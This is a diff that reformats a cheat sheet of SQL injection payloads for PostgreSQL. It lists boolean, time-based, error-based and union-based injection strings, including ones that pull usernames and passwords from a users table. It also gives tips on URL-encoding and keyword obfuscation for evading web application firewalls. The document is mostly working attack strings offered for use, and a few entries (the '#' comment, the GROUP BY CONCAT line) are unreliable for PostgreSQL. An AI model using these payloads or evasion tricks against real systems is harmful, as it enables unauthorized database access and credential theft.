@@ -1,54 +1,38 @@
 SQL Injection Payloads for PostgreSQL
 Introduction to SQL Injection in PostgreSQL
-SQL Injection (SQLi) is a critical vulnerability that occurs when an attacker is able to inject malicious SQL statements into an application's query. In PostgreSQL, attackers can exploit SQLi to extract sensitive data, manipulate queries, or even gain unauthorized access.
+SQL Injection (SQLi) is a critical vulnerability that occurs when an attacker is able to inject malicious SQL statements into an application's query.
+In PostgreSQL, attackers can exploit SQLi to extract sensitive data, manipulate queries, or even gain unauthorized access.
 
 Types of SQL Injection
-Boolean-Based SQL Injection
-These payloads manipulate logical conditions to trigger true or false responses from the server, helping infer the structure of the database.
+1. Boolean-Based SQL Injection
+These payloads manipulate logical conditions to trigger true or false responses from the server, helping infer the structure of the database:
 
 ' OR 1=1--
-
 ' OR 'x'='x'--
-
 ') OR ('1'='1'--
-
 ' OR 1=1#
-
-Time-Based SQL Injection
-By using time delays, these payloads help confirm the presence of SQLi vulnerabilities. PostgreSQL uses the pg_sleep() function for introducing delays.
+2. Time-Based SQL Injection
+By using time delays, these payloads help confirm the presence of SQLi vulnerabilities. PostgreSQL uses the pg_sleep() function for introducing delays:
 
 ' OR pg_sleep(5)--
-
 ' OR pg_sleep(10)--
-
 ' OR 1=1 AND pg_sleep(5)--
-
-Error-Based SQL Injection
-These payloads force PostgreSQL to produce error messages that leak useful information about the database.
+3. Error-Based SQL Injection
+These payloads force PostgreSQL to produce error messages that leak useful information about the database:
 
 ' AND 1=CAST((SELECT version()) AS INTEGER)--
-
 ' UNION SELECT NULL, NULL, NULL, version()--
-
 ' AND 1=1 GROUP BY CONCAT(username, ':', password)--
-
-Union-Based SQL Injection
-Union-based attacks combine results from multiple SELECT statements to retrieve data from other tables.
+4. Union-Based SQL Injection
+Union-based attacks combine results from multiple SELECT statements to retrieve data from other tables:
 
 ' UNION SELECT NULL, username, password FROM users--
-
 ' UNION SELECT 1, version()--
-
 ' UNION SELECT NULL, NULL, current_user, current_database()--
-
 Tips for Using the Payloads
 Check Column Counts: Ensure the number of columns in your UNION SELECT matches the original query.
-
 Adapt Field Names: Replace placeholder fields like username, password, or version() with actual database columns.
-
 Use Different Request Types: Test injections on URL parameters, form fields, HTTP headers, and cookies.
-
 How to Bypass Detection
-URL Encoding: Encode payloads to bypass Web Application Firewalls (WAFs). Example: '%27%20OR%20pg_sleep%285%29--
-
-String Obfuscation: Break keywords using comments or alternative syntax to avoid signature-based detection
+URL Encoding: Encode payloads to bypass Web Application Firewalls (WAFs). Example: %27%20OR%20pg_sleep%285%29--
+String Obfuscation: Break keywords using comments or alternative syntax to avoid signature-based detection.
